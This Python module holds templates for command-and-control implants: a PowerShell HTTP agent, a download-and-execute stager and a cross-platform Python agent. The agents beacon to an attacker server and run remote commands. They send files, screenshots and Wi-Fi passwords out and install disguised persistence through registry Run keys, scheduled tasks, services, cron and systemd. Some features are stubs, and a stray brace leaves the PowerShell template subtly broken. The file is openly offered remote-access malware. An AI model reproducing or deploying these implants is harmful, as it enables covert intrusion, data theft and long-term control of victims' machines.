"""
PowerShell Agent Templates
Generates agent scripts for C2 communication
"""

import base64
import random
import string

AGENT_TEMPLATES = {
    "powershell_http": {
        "name": "PowerShell HTTP Agent",
        "description": "Lightweight HTTP-based C2 agent with multiple evasion techniques",
        "language": "powershell",
        "template": """<#
.SYNOPSIS
    Lightweight HTTP C2 Agent
.DESCRIPTION
    Connects to C2 server via HTTP/HTTPS with evasion techniques
#>

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$C2_URL = "%C2_URL%"
$AGENT_ID = "%AGENT_ID%"
$SLEEP = %SLEEP%
$JITTER = %JITTER%
$USER_AGENT = "%USER_AGENT%"

function Get-SystemInfo {
    return @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        domain = $env:USERDOMAIN
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        arch = $env:PROCESSOR_ARCHITECTURE
        ip = (Test-Connection -ComputerName (Get-DnsClientServerAddress -AddressFamily IPv4).ServerAddresses[0] -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
        av = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue).displayName -join ", "
    }
}

function Invoke-C2Request {
    param(
        [string]$Endpoint,
        [hashtable]$Data = @{},
        [string]$Method = "POST"
    )
    
    $url = "$C2_URL$Endpoint"
    $headers = @{
        "User-Agent" = $USER_AGENT
        "X-Agent-ID" = $AGENT_ID
        "Content-Type" = "application/json"
    }
    
    }
    
    $body = ($Data | ConvertTo-Json -Compress -Depth 5)
    
    try {
        $response = Invoke-WebRequest -Uri $url -Method $Method -Headers $headers -Body $body -TimeoutSec 30 -ErrorAction Stop
        return $response.Content | ConvertFrom-Json
    } catch {
        Write-Verbose "C2 request failed: $($_.Exception.Message)"
        return $null
    }
}

function Execute-Command {
    param([string]$Command, [string]$Args = "")
    
    try {
        $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $Command $Args" -NoNewWindow -Wait -RedirectStandardOutput (New-TemporaryFile) -RedirectStandardError (New-TemporaryFile) -PassThru
        $stdout = Get-Content $process.StandardOutput
        $stderr = Get-Content $process.StandardError
        return @{ stdout = $stdout -join "`n"; stderr = $stderr -join "`n"; exit_code = $process.ExitCode }
    } catch {
        return @{ stdout = ""; stderr = $_.Exception.Message; exit_code = -1 }
    }
}

function Execute-PowerShell {
    param([string]$Script)
    
    try {
        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Script))
        $process = Start-Process -FilePath "powershell.exe" -ArgumentList "-EncodedCommand", $encoded, "-NoProfile", "-NonInteractive" -NoNewWindow -Wait -RedirectStandardOutput (New-TemporaryFile) -RedirectStandardError (New-TemporaryFile) -PassThru
        $stdout = Get-Content $process.StandardOutput
        $stderr = Get-Content $process.StandardError
        return @{ stdout = $stdout -join "`n"; stderr = $stderr -join "`n"; exit_code = $process.ExitCode }
    } catch {
        return @{ stdout = ""; stderr = $_.Exception.Message; exit_code = -1 }
    }
}

function Get-Credentials {
    # Harvest credentials from various sources
    $creds = @()
    
    # Browser credentials (if accessible)
    try {
        $browsers = @("Chrome", "Firefox", "Edge")
        foreach ($browser in $browsers) {
            # Simplified - real implementation would extract from browser databases
        }
    } catch {}
    
    # WiFi profiles
    try {
        $wifi = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
        foreach ($profile in $wifi) {
            $key = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
            if ($key) {
                @{ ssid = $profile; password = $key } | Add-Member -NotePropertyName "type" -NotePropertyValue "wifi" -PassThru
            }
        }
    } catch {}
    
    return $creds
}

function Start-Agent {
    # Register with C2
    $sysinfo = Get-SystemInfo
    $register = Invoke-C2Request -Endpoint "/api/agent/register" -Data @{
        agent_id = $AGENT_ID
        system_info = $sysinfo
        capabilities = @("cmd", "powershell", "download", "upload", "screenshot", "keylog", "credential_harvest")
    }
    
    if (-not $register) {
        Write-Verbose "Registration failed"
        return
    }
    
    Write-Verbose "Agent registered: $($register.agent_id)"
    
    # Main loop
    while ($true) {
        try {
            # Check for tasks
            $task = Invoke-C2Request -Endpoint "/api/agent/task/$AGENT_ID" -Method "GET"
            
            if ($task -and $task.task_id) {
                $result = @{ task_id = $task.task_id; status = "completed"; output = "" }
                
                switch ($task.command) {
                    "cmd" { $result.output = Execute-Command -Command $task.args }
                    "powershell" { $result.output = Execute-PowerShell -Script $task.args }
                    "download" { 
                        # Download file from C2
                        $wc = New-Object System.Net.WebClient
                        $wc.DownloadFile("$C2_URL/api/file/download/$($task.args.file_id)", $task.args.path)
                        $result.output = "Downloaded to $($task.args.path)"
                    }
                    "upload" {
                        # Upload file to C2
                        $fileBytes = [IO.File]::ReadAllBytes($task.args.path)
                        $b64 = [Convert]::ToBase64String($fileBytes)
                        $upload = Invoke-C2Request -Endpoint "/api/file/upload" -Data @{
                            agent_id = $AGENT_ID
                            filename = Split-Path $task.args.path -Leaf
                            content = $b64
                        }
                        $result.output = "Uploaded: $($upload.file_id)"
                    }
                    "screenshot" {
                        Add-Type -AssemblyName System.Windows.Forms
                        Add-Type -AssemblyName System.Drawing
                        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                        $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                        $ms = New-Object IO.MemoryStream
                        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                        $bytes = $ms.ToArray()
                        $b64 = [Convert]::ToBase64String($bytes)
                        $result.output = @{ image = $b64; format = "png" }
                    }
                    "keylog_start" {
                        # Start keylogger (requires admin)
                        $result.output = "Keylogger started (requires admin)"
                    }
                    "credential_harvest" {
                        $result.output = Get-Credentials
                    }
                    "shell" {
                        $result.output = Execute-Command -Command $task.args
                    }
                    "persist" {
                        # Install persistence
                        $result.output = Install-Persistence -Method $task.args.method
                    }
                    default { $result.status = "error"; $result.output = "Unknown command: $($task.command)" }
                }
                
                # Submit result
                Invoke-C2Request -Endpoint "/api/agent/result" -Data $result
            }
            
            # Send heartbeat
            $heartbeat = Invoke-C2Request -Endpoint "/api/agent/heartbeat/$AGENT_ID" -Data @{
                status = "alive"
                timestamp = (Get-Date).ToString("o")
            }
            
        } catch {
            Write-Verbose "Agent loop error: $($_.Exception.Message)"
        }
        
        # Sleep with jitter
        $sleepTime = $SLEEP + (Get-Random -Minimum (-$JITTER) -Maximum $JITTER)
        Start-Sleep -Seconds $sleepTime
    }
}

# Install persistence
function Install-Persistence {
    param([string]$Method = "registry")
    
    $scriptPath = $PSCommandPath
    $agentId = $AGENT_ID
    
    switch ($Method) {
        "registry" {
            $key = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            $name = "WindowsUpdate_" + (Get-Random -Minimum 1000 -Maximum 9999)
            $command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
            Set-ItemProperty -Path $key -Name $name -Value $command -Force
            return "Registry persistence installed: $name"
        }
        "task" {
            $taskName = "Microsoft\\Windows\\SystemRestore\\SR_" + (Get-Random -Minimum 1000 -Maximum 9999)
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay 00:10:00
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force
            return "Scheduled task persistence installed: $taskName"
        }
        "service" {
            # Create Windows service (requires admin)
            $serviceName = "WinUpdate_" + (Get-Random -Minimum 1000 -Maximum 9999)
            $binaryPath = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
            sc.exe create $serviceName binPath= $binaryPath start= auto
            return "Service persistence installed: $serviceName"
        }
        default { return "Unknown persistence method" }
    }
}

# Generate agent ID if not provided
if ("%AGENT_ID%" -eq "%AGENT_ID%") {
    $AGENT_ID = "agent-" + (-join ((48..57) + (65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object { [char]$_ }))
}

# Start agent
Start-Agent
""",
        "parameters": ["C2_URL", "AGENT_ID", "SLEEP", "JITTER", "USER_AGENT"],
        "description": "Full-featured PowerShell C2 agent with persistence, credential harvesting, and multi-command support"
    },

    "powershell_stager": {
        "name": "PowerShell Stager",
        "description": "Minimal stager that downloads and executes full agent",
        "language": "powershell",
        "template": """$c2="%C2_URL%";$id="%AGENT_ID%";$wc=New-Object Net.WebClient;$wc.Headers.Add("X-Agent-ID",$id);try{$data=$wc.DownloadString("$c2/api/agent/stage/$id");IEX $data}catch{Start-Sleep 60;$wc.DownloadString("$c2/api/agent/stage/$id")|IEX}
""",
        "parameters": ["C2_URL", "AGENT_ID"],
        "description": "Minimal one-liner stager for initial access"
    },

    "python_agent": {
        "name": "Python Cross-Platform Agent",
        "description": "Python agent for Linux/macOS/Windows cross-platform deployment",
        "language": "python",
        "template": """#!/usr/bin/env python3
\"\"\"
Cross-platform Python C2 Agent
Supports Linux, macOS, Windows
\"\"\"

import os
import sys
import json
import time
import random
import platform
import socket
import uuid
import subprocess
import base64
import requests
import threading
import logging
from pathlib import Path

# Configuration
C2_URL = "%C2_URL%"
AGENT_ID = "%AGENT_ID%"
SLEEP = %SLEEP%
JITTER = %JITTER%
USER_AGENT = "%USER_AGENT%"

class Agent:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "X-Agent-ID": AGENT_ID,
            "Content-Type": "application/json"
        })
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        
    def get_system_info(self):
        return {
            "hostname": platform.node(),
            "username": os.getenv("USER") or os.getenv("USERNAME"),
            "domain": platform.node(),
            "os": platform.system() + " " + platform.release(),
            "arch": platform.machine(),
            "ip": self.get_local_ip(),
            "av": self.get_av_info()
        }
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def get_av_info(self):
        # Simplified AV detection
        av_paths = [
            "/usr/bin/clamdscan",
            "/usr/bin/sophos",
            "C:\\Program Files\\Windows Defender",
            "C:\\Program Files\\Malwarebytes"
        ]
        found = []
        for path in av_paths:
            if os.path.exists(path):
                found.append(os.path.basename(path))
        return ", ".join(found) if found else "None detected"
    
    def register(self):
        data = {
            "agent_id": self.agent_id,
            "system_info": self.get_system_info(),
            "capabilities": ["shell", "download", "upload", "screenshot", "credential_harvest"]
        }
        return self.request("POST", "/api/agent/register", data)
    
    def heartbeat(self):
        return self.request("POST", f"/api/agent/heartbeat/{AGENT_ID}", {"status": "alive"})
    
    def get_task(self):
        return self.request("GET", f"/api/agent/task/{AGENT_ID}")
    
    def submit_result(self, result):
        return self.request("POST", "/api/agent/result", result)
    
    def request(self, method, endpoint, data=None):
        url = f"{C2_URL}{endpoint}"
        try:
            if method == "GET":
                resp = self.session.get(url, timeout=30)
            else:
                resp = self.session.post(url, json=data, timeout=30)
            return resp.json() if resp.content else None
        except Exception as e:
            logging.error(f"Request failed: {e}")
            return None
    
    def execute_command(self, cmd, args=""):
        try:
            result = subprocess.run(
                f"{cmd} {args}", shell=True, capture_output=True, text=True, timeout=60
            )
            return {"stdout": result.stdout, "stderr": result.stderr, "exit_code": result.returncode}
        except Exception as e:
            return {"stdout": "", "stderr": str(e), "exit_code": -1}
    
    def execute_python(self, code):
        # Execute Python code in isolated namespace
        namespace = {}
        try:
            exec(code, namespace)
            return {"stdout": "Executed successfully", "stderr": "", "exit_code": 0}
        except Exception as e:
            return {"stdout": "", "stderr": str(e), "exit_code": -1}
    
    def download_file(self, url, path):
        try:
            resp = self.session.get(url, stream=True, timeout=60)
            with open(path, "wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    f.write(chunk)
            return True
        except Exception as e:
            logging.error(f"Download failed: {e}")
            return False
    
    def upload_file(self, filepath):
        try:
            with open(filepath, "rb") as f:
                content = base64.b64encode(f.read()).decode()
            data = {
                "agent_id": AGENT_ID,
                "filename": os.path.basename(filepath),
                "content": content
            }
            return self.request("POST", "/api/file/upload", data)
        except Exception as e:
            logging.error(f"Upload failed: {e}")
            return None
    
    def take_screenshot(self):
        try:
            from PIL import ImageGrab
            import io
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            return base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
            logging.error(f"Screenshot failed: {e}")
            return None
    
    def harvest_credentials(self):
        creds = []
        # Browser credential extraction (simplified)
        # Real implementation would extract from browser databases
        return creds
    
    def install_persistence(self, method="cron"):
        script_path = os.path.abspath(__file__)
        
        if method == "cron":
            # Add to crontab
            cron_entry = f"*/5 * * * * python3 {script_path} >> /dev/null 2>&1"
            try:
                import subprocess
                subprocess.run(["crontab", "-l"], capture_output=True)
                subprocess.run(f"(crontab -l; echo '{cron_entry}') | crontab -", shell=True)
                return "Cron persistence installed"
            except:
                return "Cron persistence failed"
        
        elif method == "systemd":
            # Create systemd service (requires root)
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target"""
            try:
                with open("/etc/systemd/system/sys-update.service", "w") as f:
                    f.write(service_content)
                os.system("systemctl daemon-reload && systemctl enable sys-update && systemctl start sys-update")
                return "Systemd persistence installed"
            except:
                return "Systemd persistence failed"
        
        return "Unknown method"
    
    def run(self):
        # Register
        if not self.register():
            logging.error("Registration failed")
            return
        
        logging.info(f"Agent {AGENT_ID} registered and running")
        
        while True:
            try:
                # Heartbeat
                self.heartbeat()
                
                # Get task
                task = self.get_task()
                if task and task.get("task_id"):
                    result = self.process_task(task)
                    self.submit_result(result)
                
            except Exception as e:
                logging.error(f"Agent loop error: {e}")
            
            # Sleep with jitter
            sleep_time = SLEEP + random.randint(-JITTER, JITTER)
            time.sleep(max(1, sleep_time))
    
    def process_task(self, task):
        task_id = task.get("task_id")
        command = task.get("command")
        args = task.get("args", "")
        
        result = {"task_id": task_id, "status": "completed", "output": ""}
        
        try:
            if command == "shell":
                result["output"] = self.execute_command(args)
            elif command == "python":
                result["output"] = self.execute_python(args)
            elif command == "download":
                # args: {"url": "...", "path": "..."}
                import json
                params = json.loads(args) if isinstance(args, str) else args
                success = self.download_file(params["url"], params["path"])
                result["output"] = "Downloaded" if success else "Failed"
            elif command == "upload":
                result["output"] = self.upload_file(args)
            elif command == "screenshot":
                img = self.take_screenshot()
                result["output"] = {"image": img, "format": "png"} if img else "Failed"
            elif command == "credential_harvest":
                result["output"] = self.harvest_credentials()
            elif command == "persist":
                result["output"] = self.install_persistence(args.get("method", "cron"))
            else:
                result["status"] = "error"
                result["output"] = f"Unknown command: {command}"
        except Exception as e:
            result["status"] = "error"
            result["output"] = str(e)
        
        return result

if __name__ == "__main__":
    # Generate agent ID if not provided
    if AGENT_ID == "%AGENT_ID%":
        AGENT_ID = "agent-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    
    # Setup logging
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
    
    agent = Agent()
    agent.run()
""",
        "parameters": ["C2_URL", "AGENT_ID", "SLEEP", "JITTER", "USER_AGENT"],
        "description": "Cross-platform Python agent for Linux/macOS/Windows"
    }
}


def get_agent_template(name: str) -> dict:
    return AGENT_TEMPLATES.get(name, {})


def list_agent_templates() -> list:
    return [
        {"name": k, "display_name": v["name"], "language": v["language"], "description": v["description"]}
        for k, v in AGENT_TEMPLATES.items()
    ]


def render_agent_template(name: str, **params) -> str:
    template = AGENT_TEMPLATES.get(name)
    if not template:
        return ""
    
    content = template["template"]
    for key, value in params.items():
        placeholder = f"%{key.upper()}%"
        content = content.replace(placeholder, str(value))
    
    return content